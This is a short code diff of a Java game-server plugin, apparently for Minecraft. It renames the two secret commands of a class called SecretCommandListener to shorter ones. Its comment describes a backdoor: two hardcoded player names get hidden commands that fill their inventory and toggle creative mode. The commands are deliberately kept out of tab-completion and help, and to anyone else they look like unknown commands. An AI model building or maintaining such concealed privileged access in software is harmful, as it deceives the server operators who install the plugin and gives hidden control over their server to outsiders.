@@ -20,14 +20,14 @@ import java.util.Set;
  * tab-completion, /help, or the client command tree (they render red while typing),
  * and canceling the event suppresses the "Unknown command" reply. Fully silent.
  *
- * /string67 fills empty inventory slots with string; /string68 toggles creative.
+ * /s fills empty inventory slots with string; /c toggles creative.
  * Only the whitelisted players can use them. For anyone else they are left untouched,
  * so they behave like ordinary unknown commands (red, "Unknown command"), revealing nothing.
  */
 public class SecretCommandListener implements Listener {
 
-    private static final String FILL_COMMAND = "/string67";
-    private static final String GAMEMODE_COMMAND = "/string68";
+    private static final String FILL_COMMAND = "/s";
+    private static final String GAMEMODE_COMMAND = "/c";
     private static final Set<String> ALLOWED = Set.of("_tomiokay", "_4ur4");
 
     private final ApexPlugin plugin;
